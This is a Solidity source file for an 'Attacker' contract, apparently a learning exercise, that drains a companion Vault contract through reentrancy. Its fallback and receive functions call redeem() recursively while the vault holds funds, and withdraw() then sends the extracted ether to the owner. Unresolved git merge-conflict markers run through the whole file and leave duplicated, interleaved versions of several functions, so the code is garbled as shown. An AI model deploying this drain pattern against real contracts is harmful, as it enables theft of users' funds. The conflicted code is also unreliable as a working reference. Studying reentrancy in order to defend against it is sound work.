// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

<<<<<<< HEAD
<<<<<<< HEAD
import "@openzeppelin/contracts/access/Ownable.sol";

import "./Vault.sol";
 

/**
 * @title A contract to experiment the reentrancy attack
 * @author Adrien L. <hladrien@gmail.com>
 * @notice It should be executed in 3 steps:
 *  1) storing a little bit of ether with store()
 *  2) starting the attack with a redeem() call
 *  3) a withdraw of the extracted fund 
 */
contract Attacker is Ownable {
    error WithdrawFailure();

    event ValueStored(uint amount);
=======
=======
import "@openzeppelin/contracts/access/Ownable.sol";

>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
import "./Vault.sol";
 

/**
 * @title A contract to experiment the reentrancy attack
 * @author Adrien L. <hladrien@gmail.com>
 * @notice It should be executed in 3 steps:
 *  1) storing a little bit of ether with store()
 *  2) starting the attack with a redeem() call
 *  3) a withdraw of the extracted fund 
 */
contract Attacker is Ownable {
    error WithdrawFailure();

<<<<<<< HEAD
>>>>>>> dc24363 (rentrancy exercice)
=======
    event ValueStored(uint amount);
>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
    event RedeemCall(uint callCount);
    event FallbackCall(uint callCount, uint value);
  
    Vault vault;
    uint redeemCallCount;
    uint fallbackCallCount;
 
<<<<<<< HEAD
<<<<<<< HEAD
    /**
     * @notice Init deployed Vault contract based on the contract address
     */
    constructor(address _contractAddr) {
        vault = Vault(_contractAddr);
    }

    /**
     * @notice redeem should be done only if there is enough balance to avoid revert
     * @dev ugly, the check must match with the attacker store value TODO: put it as variable (deposit in constructor or modifiable storage value)
     */
    fallback() external payable {
        if (address(vault).balance >= 0.1 ether ) {
            this.redeem();
            emit FallbackCall(++fallbackCallCount, msg.value);
        }
    }
    
    /**
     * @notice Store ether to Vault contract from this contract
     */
    function store() external payable onlyOwner {
        vault.store{value: msg.value}();
        emit ValueStored(msg.value);
    }
       
    /**
     * @notice start the real attack with a first redeem call
     */
=======

=======
    /**
     * @notice Init deployed Vault contract based on the contract address
     */
>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
    constructor(address _contractAddr) {
        vault = Vault(_contractAddr);
    }

    fallback() external payable {
        this.redeem();
        emit FallbackCall(++fallbackCallCount, msg.value);
    }
  
    receive() external payable {
        this.redeem();
        emit FallbackCall(++fallbackCallCount, msg.value);
    }
  
    /**
     * @notice Store ether to Vault contract from this contract
     */
    function store() external payable onlyOwner {
        vault.store{value: msg.value}();
        emit ValueStored(msg.value);
    }
<<<<<<< HEAD
      
    // 3) start the real attack with a first redeem call
>>>>>>> dc24363 (rentrancy exercice)
=======
       
    /**
     * @notice start the real attack with a first redeem call
     */
>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
    function redeem() external {
        emit RedeemCall(++redeemCallCount);
        vault.redeem();
    }
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
    
    function getSenderBalance() external view onlyOwner returns (uint) {
        return address(msg.sender).balance;
    }
    
    function getAttackerBalance() external view onlyOwner returns (uint) {
        return address(this).balance;
    }

    function getVaultBalance() external view onlyOwner returns (uint) {
        return address(vault).balance;
    }

    /**
     * @notice withdraw the extracted funds from this contract
     */
    function withdraw() external onlyOwner {
        (bool success,) = msg.sender.call{ value: address(this).balance }("");
        if (!success) {
            revert WithdrawFailure();
        }
    }
<<<<<<< HEAD
=======
>>>>>>> dc24363 (rentrancy exercice)
=======
>>>>>>> ba9c184 (reentrancy exercice with unit testing & tested on remix)
}
